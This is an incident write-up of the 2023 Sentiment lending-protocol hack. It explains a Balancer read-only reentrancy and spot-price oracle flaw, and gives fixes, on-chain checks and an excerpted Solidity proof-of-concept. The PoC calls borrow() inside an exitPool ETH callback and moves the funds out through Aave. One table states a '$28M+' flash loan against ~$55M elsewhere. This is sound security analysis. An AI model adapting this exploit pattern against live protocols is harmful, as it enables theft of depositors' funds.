# Sentiment — Balancer Pool Price Dependency Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2023-04-04 |
| **Protocol** | Sentiment |
| **Chain** | Arbitrum |
| **Loss** | ~$1,000,000 |
| **Attacker** | [0xdd0c...e49C3](https://arbiscan.io/address/0xdd0cDb4c3b887bc533957BC32463977E432e49C3) |
| **Attack Contract** | [0x9f62...eA9D0](https://arbiscan.io/address/0x9f626F5941FAfe0A5b839907d77fbBD5d0deA9D0) |
| **Attack Tx** | [0xa9ff2b58...](https://arbiscan.io/tx/0xa9ff2b587e2741575daf893864710a5cbb44bb64ccdc487a100fa20741e0f74d) |
| **Vulnerable Contract** | [WeightedBalancerLPOracle](https://arbiscan.io/address/0x16F3ae9C1727ee38c98417cA08BA785BB7641b5B) |
| **Root Cause** | Balancer pool spot price-dependent oracle susceptible to flash loan + read-only reentrancy manipulation |
| **Attack Block** | 77,026,913 (Arbitrum) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/Sentiment_exp.sol) |

---

## 1. Vulnerability Overview

Sentiment is a permissionless lending protocol operating on Arbitrum. Users can deposit collateral and borrow various assets, with collateral value evaluated in real time through `WeightedBalancerLPOracle`.

This attack is a case where two vulnerabilities are combined: **Read-Only Reentrancy** and a **Balancer spot price-dependent oracle**.

Balancer Vault's `exitPool()` function calls the receiving contract's `receive()` or `fallback()` function when returning ETH during liquidity removal. At the moment this callback executes, the Balancer Vault's internal pool balances are **not yet updated**. Since `WeightedBalancerLPOracle.getPrice()` reads pool balances at this point to calculate the LP token price, an attacker can create a temporarily **inflated collateral value** during the process of supplying and removing large amounts of liquidity.

The attacker exploited this callback window to call Sentiment's `borrow()` function, over-borrowing USDC, USDT, WETH, and FRAX against an overvalued collateral position, then depositing and withdrawing those funds via Aave V3 for profit.

### Core Vulnerability Combination

| Vulnerability | Description |
|--------|------|
| Read-Only Reentrancy | LP price is queried via a view function during the Balancer exitPool() ETH callback, returning an inflated value |
| Spot Price Oracle Dependency | WeightedBalancerLPOracle uses only instantaneous pool balance-based pricing |
| Flash Loan Capital Amplification | $28M+ in assets borrowed uncollateralized from Aave V3 to fund the attack |

---

## 2. Vulnerable Code Analysis

### 2.1 WeightedBalancerLPOracle.getPrice() — Spot Price Reference During Reentrancy (Core Vulnerability)

```solidity
// ❌ Vulnerable oracle code (inferred logic)
function getPrice(address token) external view returns (uint256) {
    IBalancerToken bToken = IBalancerToken(token);
    bytes32 poolId = bToken.getPoolId();

    // ❌ Reads current pool balances directly from Balancer Vault
    // During exitPool() callback, internal balances are not yet updated,
    // causing the calculation to appear as if more balance remains than actually does
    (address[] memory tokens, uint256[] memory balances,) =
        IBalancerVault(BALANCER_VAULT).getPoolTokens(poolId);

    // ❌ Weighted average price calculated from instantaneous balances → manipulable
    uint256 price = _calculateWeightedPrice(tokens, balances);
    return price;
}
```

```solidity
// ✅ Fixed code — using Balancer VaultReentrancyLib
import { VaultReentrancyLib } from "@balancer/VaultReentrancyLib.sol";

function getPrice(address token) external view returns (uint256) {
    // ✅ Checks Balancer Vault reentrancy state — reverts if called during callback
    VaultReentrancyLib.ensureNotInVaultContext(IVault(BALANCER_VAULT));

    IBalancerToken bToken = IBalancerToken(token);
    bytes32 poolId = bToken.getPoolId();

    (address[] memory tokens, uint256[] memory balances,) =
        IBalancerVault(BALANCER_VAULT).getPoolTokens(poolId);

    uint256 price = _calculateWeightedPrice(tokens, balances);
    return price;
}
```

**Problem**: Because `getPrice()` is a `view` function, a standard `nonReentrant` guard cannot be applied to it. While `exitPool()` triggers an external callback during ETH transfer, pool balances remain in a pre-update state, causing the oracle price to be temporarily inflated.

---

### 2.2 AccountManager.borrow() — Collateral Valuation Using Manipulated Oracle Price

```solidity
// ❌ Vulnerable borrow logic (inferred)
function borrow(address account, address token, uint256 amt) external {
    // ❌ References manipulated oracle price when called during reentrancy callback
    uint256 collateralValue = _getCollateralValue(account); // includes oracle call
    uint256 borrowValue = _getBorrowValue(account);

    // Health check passes due to manipulated collateralValue
    require(collateralValue >= borrowValue + amt, "insufficient collateral");

    _borrow(account, token, amt);
}
```

```solidity
// ✅ Fix direction — block reentrancy at oracle level + additional defense layer
function borrow(address account, address token, uint256 amt) external nonReentrant {
    // ✅ Add self-contained reentrancy guard (additional defense layer when depending on LP oracle)
    uint256 collateralValue = _getCollateralValue(account);
    uint256 borrowValue = _getBorrowValue(account);
    require(collateralValue >= borrowValue + amt, "insufficient collateral");
    _borrow(account, token, amt);
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Deploy attack contract (0x9f626...eA9D0)
- No prior account creation in Sentiment required — `openAccount()` is called during the attack

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────┐
│                 Attacker (0xdd0c...e49C3)                    │
│           Attack Contract (0x9f62...eA9D0)                   │
└────────────────────────┬────────────────────────────────────┘
                         │ testExploit() called
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 1: Aave V3 Flash Loan                                  │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  WBTC: 606 (~$17M)                                   │   │
│  │  WETH: 10,050 (~$20M)                                │   │
│  │  USDC: 18,000,000 (~$18M)                            │   │
│  │  Total ~$55M uncollateralized loan                   │   │
│  └──────────────────────────────────────────────────────┘   │
└────────────────────────┬────────────────────────────────────┘
                         │ executeOperation() callback
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 2: Open Sentiment Account + Deposit Collateral         │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  AccountManager.openAccount()                         │   │
│  │  50 WETH → AccountManager.deposit()                   │   │
│  │  AccountManager.exec() → Balancer joinPool()          │   │
│  │  (Add 50 WETH as LP to Balancer pool → register as   │   │
│  │   collateral)                                         │   │
│  └──────────────────────────────────────────────────────┘   │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 3: Large-Scale Balancer joinPool() — Price Inflation   │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  606 WBTC + 10,000 WETH + 18,000,000 USDC            │   │
│  │  → Supply liquidity to Balancer pool (receive LP      │   │
│  │    tokens)                                            │   │
│  │  [Price check: oracle.getPrice() confirms normal      │   │
│  │   value]                                              │   │
│  └──────────────────────────────────────────────────────┘   │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 4: exitPool() — Critical Vulnerable Window             │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  Balancer.exitPool() called                           │   │
│  │  ├─ Balancer internally: balance update begins        │   │
│  │  ├─ receive()/fallback() callback triggered for ETH   │   │
│  │  │   return                                           │   │
│  │  │                                                    │   │
│  │  │  ┌─────────────────────────────────────────────┐  │   │
│  │  │  │  fallback() — when nonce == 2                │  │   │
│  │  │  │  ⚡ Vulnerable moment: balances not yet      │  │   │
│  │  │  │     updated!                                 │  │   │
│  │  │  │  oracle.getPrice() → returns inflated LP     │  │   │
│  │  │  │  price                                       │  │   │
│  │  │  │                                              │  │   │
│  │  │  │  AccountManager.borrow():                    │  │   │
│  │  │  │  ├─ Borrow USDC  461,000                     │  │   │
│  │  │  │  ├─ Borrow USDT  361,000                     │  │   │
│  │  │  │  ├─ Borrow WETH  81                          │  │   │
│  │  │  │  └─ Borrow FRAX  125,000                     │  │   │
│  │  │  └─────────────────────────────────────────────┘  │   │
│  │  │                                                    │   │
│  │  └─ Balancer internally: balance update complete      │   │
│  │     (too late)                                        │   │
│  └──────────────────────────────────────────────────────┘   │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 5: Laundering Borrowed Funds via Aave V3               │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  FRAX → FraxBP (Curve) swap → receive USDC           │   │
│  │  USDC, USDT, WETH → Aave V3 supply()                 │   │
│  │  Aave V3 withdraw() → attacker wallet receives funds  │   │
│  └──────────────────────────────────────────────────────┘   │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 6: Repay Aave V3 Flash Loan                            │
│  Repay WBTC, WETH, USDC with fees → attack complete          │
└─────────────────────────────────────────────────────────────┘
```

### 3.3 Results

| Item | Amount |
|------|------|
| Flash Loan Size | ~$55M (WBTC + WETH + USDC) |
| Stolen Borrowed Funds | USDC 461,000 + USDT 361,000 + WETH 81 + FRAX 125,000 |
| Attacker Net Profit | ~$1,000,000 |
| Protocol Loss | ~$1M in bad debt from unrepaid collateral |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Key attack functions excerpted — full code: DeFiHackLabs/src/test/2023-04/Sentiment_exp.sol

contract ContractTest is Test {
    // [Step 1] Attack entry point — request Aave V3 flash loan
    function testExploit() external {
        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);  // 606 WBTC
        assets[1] = address(WETH);  // 10,050 WETH
        assets[2] = address(USDC);  // 18,000,000 USDC

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 606 * 1e8;
        amounts[1] = 10_050_100 * 1e15;
        amounts[2] = 18_000_000 * 1e6;

        // ← Request ~$55M flash loan from Aave V3
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    // [Step 2] Aave flash loan callback — execute attack
    function executeOperation(...) external payable returns (bool) {
        depositCollateral(assets); // Deposit collateral into Sentiment + register small Balancer LP
        joinPool(assets);          // Supply large liquidity to Balancer pool (prepare price inflation)
        exitPool();                // ⚡ Core: call borrow() during exitPool() ETH callback
        // Approve flash loan repayment
        WETH.approve(address(aaveV3), type(uint256).max);
        WBTC.approve(address(aaveV3), type(uint256).max);
        USDC.approve(address(aaveV3), type(uint256).max);
        return true;
    }

    // [Step 4] Handle exitPool — callback trigger point
    function exitPool() internal {
        // Balancer exitPool() → triggers fallback() callback when returning ETH
        Balancer.exitPool(PoolId, address(this), payable(address(this)), exitPoolRequest);
        // After callback, oracle price returns to normal (too late)
    }

    // [Step 4-A] Receive ETH callback — call borrow() at vulnerable moment
    fallback() external payable {
        if (nonce == 2) {
            // ⚡ At this point: Balancer balances not yet updated → oracle price inflated
            // ⚡ WeightedBalancerLPOracle.getPrice() → returns excessive collateral value
            borrowAll(); // Execute over-borrowing from Sentiment
        }
        nonce++;
    }

    // [Step 5] Execute over-borrowing
    function borrowAll() internal {
        // Borrow beyond limit based on inflated collateral value
        AccountManager.borrow(account, address(USDC), 461_000 * 1e6);
        AccountManager.borrow(account, address(USDT), 361_000 * 1e6);
        AccountManager.borrow(account, address(WETH), 81 * 1e18);
        AccountManager.borrow(account, address(FRAX), 125_000 * 1e18);

        // Launder FRAX → USDC swap
        AccountManager.exec(account, FRAXBP, 0,
            abi.encodeWithSignature("exchange(int128,int128,uint256,uint256)", 0, 1, 120_000 * 1e18, 1));

        // Move funds via Aave V3 → final withdrawal
        AccountManager.exec(account, address(aaveV3), 0,
            abi.encodeWithSignature("supply(address,uint256,address,uint16)",
                address(USDC), 580_000 * 1e6, account, 0));
        AccountManager.exec(account, address(aaveV3), 0,
            abi.encodeWithSignature("withdraw(address,uint256,address)",
                address(USDC), type(uint256).max, address(this)));
        // Same pattern for USDT and WETH withdrawals
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Read-Only Reentrancy | CRITICAL | CWE-841 | 01_reentrancy.md |
| V-02 | Spot Price Oracle Dependency | HIGH | CWE-1258 | 04_oracle_manipulation.md |
| V-03 | Flash Loan Capital Amplification | MEDIUM | CWE-400 | 02_flash_loan.md |

### V-01: Read-Only Reentrancy

- **Description**: Balancer Vault's `exitPool()` triggers an external callback while returning ETH, at which point internal pool balances have not yet been updated. Since `WeightedBalancerLPOracle.getPrice()` is a `view` function, it is not protected by a standard `nonReentrant` guard and returns prices based on inflated balances even during the callback.
- **Impact**: An attacker can temporarily overvalue collateral and borrow more assets than the collateral actually supports.
- **Attack Conditions**: Protocol that accepts Balancer LP tokens as collateral + `view` function-based oracle + attack contract capable of receiving ETH

### V-02: Spot Price Oracle Dependency

- **Description**: `WeightedBalancerLPOracle` calculates LP token prices based on instantaneous Balancer pool balances (`getPoolTokens()`). Only spot prices are used, with no manipulation-resistant feeds such as TWAP or Chainlink.
- **Impact**: Large-scale liquidity manipulation via flash loans can cause temporary price distortion.
- **Attack Conditions**: Large capital (flash loan) + sufficient pool depth manipulation potential

### V-03: Flash Loan Capital Amplification

- **Description**: Leverages Aave V3 flash loans to source approximately $55M in capital without collateral, securing the liquidity needed for the attack.
- **Impact**: Attackers with limited capital can execute large-scale attacks.
- **Attack Conditions**: Protocol that permits flash loans + repayment within the same transaction

---

## 6. Remediation Recommendations

### Immediate Actions

**Apply Balancer VaultReentrancyLib (most critical)**:

```solidity
// ✅ Use the reentrancy prevention library officially provided by Balancer
import { VaultReentrancyLib } from "@balancer-labs/v2-pool-utils/contracts/lib/VaultReentrancyLib.sol";

contract WeightedBalancerLPOracle {
    IVault private immutable _vault;

    function getPrice(address token) external view returns (uint256) {
        // ✅ Reverts if called within Balancer Vault context
        // Automatically blocks this function call during exitPool() ETH callback
        VaultReentrancyLib.ensureNotInVaultContext(_vault);

        // Normal price calculation proceeds after this
        bytes32 poolId = IBalancerToken(token).getPoolId();
        (address[] memory tokens, uint256[] memory balances,) =
            _vault.getPoolTokens(poolId);
        return _calculateWeightedPrice(tokens, balances);
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Read-Only Reentrancy | Apply `VaultReentrancyLib.ensureNotInVaultContext()` to oracle |
| Spot Price Dependency | Use Chainlink price feeds in conjunction with Balancer `getTimeWeightedAverage()` |
| Single Oracle | Validate price deviation thresholds (e.g., revert on >5% change from recent price) |
| Oracle Manipulation | Circuit breaker — temporarily suspend collateral evaluation on sudden price spikes/drops within a single block |
| Flash Loan Defense | Cooldown logic requiring a minimum number of blocks after liquidity provision before LP tokens count as collateral |

---

## 7. Lessons Learned

1. **`view` functions can also be vulnerable to reentrancy attacks**: Traditional reentrancy guards (`nonReentrant`) apply only to state-changing functions and do not protect `view` functions. LP oracles for protocols like Balancer and Curve that return ETH directly must always include a separate reentrancy context check.

2. **Balancer LP oracles must not be used without VaultReentrancyLib**: The Balancer Foundation was aware of this vulnerability and officially released `VaultReentrancyLib`. All lending protocols that accept Balancer LP tokens as collateral must apply this library.

3. **Spot prices are unsuitable as oracles**: Using spot prices (AMM pool balances) that can be manipulated within a single block as a sole price feed is vulnerable to flash loan attacks. TWAP (time-weighted average price) or external feeds such as Chainlink must be used in combination.

4. **Permissionless collateral acceptance requires stricter security review**: Sentiment is a permissionless lending protocol that accepts various assets as collateral. When adding new collateral assets, it is essential to verify that the asset's oracle implementation is reentrancy-safe.

5. **Repeated despite dForce precedent**: Approximately two months prior, dForce lost $3.65M to the same Balancer read-only reentrancy vulnerability (2023-02-09). Ecosystem-wide vulnerability sharing and faster response times are needed.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Item | Value |
|------|-----|
| Tx Hash | `0xa9ff2b587e2741575daf893864710a5cbb44bb64ccdc487a100fa20741e0f74d` |
| Attacker EOA | `0xdd0cDb4c3b887bc533957BC32463977E432e49C3` |
| Attack Contract | `0x9f626F5941FAfe0A5b839907d77fbBD5d0deA9D0` |
| Block Number | 77,026,913 |
| Gas Used | 7,813,095 |
| Fork Block (PoC) | 77,026,912 (block immediately before attack) |

### 8.2 On-Chain Event Log Sequence

Confirmed via log analysis that the PoC code and on-chain transaction execution flows match:

1. Aave V3 FlashLoan → WBTC/WETH/USDC transfers (Transfer events)
2. Balancer joinPool → LP token mint
3. Balancer exitPool → LP token burn + ETH return callback
4. **During callback**: Sentiment borrow() events (USDC, USDT, WETH, FRAX)
5. Aave V3 supply/withdraw → fund movement
6. Aave V3 flash loan repayment

### 8.3 PoC vs. On-Chain Amount Comparison

| Item | PoC Code | On-Chain Actual | Match |
|------|----------|-------------|------|
| WBTC Flash Loan | 606 BTC | 606 BTC | ✅ |
| WETH Flash Loan | 10,050.1 ETH | 10,050.1 ETH | ✅ |
| USDC Flash Loan | 18,000,000 | 18,000,000 | ✅ |
| USDC Borrowed | 461,000 | ~461,000 | ✅ |
| USDT Borrowed | 361,000 | ~361,000 | ✅ |
| Attacker Final Profit | ~$1M | ~$1M | ✅ |

### 8.4 Reference Links

- PeckShield Analysis: https://twitter.com/peckshield/status/1643417467879059456
- spreekaway Analysis: https://twitter.com/spreekaway/status/1643313471180644360
- Balancer Read-Only Reentrancy Theory Explained: https://medium.com/coinmonks/theoretical-practical-balancer-and-read-only-reentrancy-part-1-d6a21792066c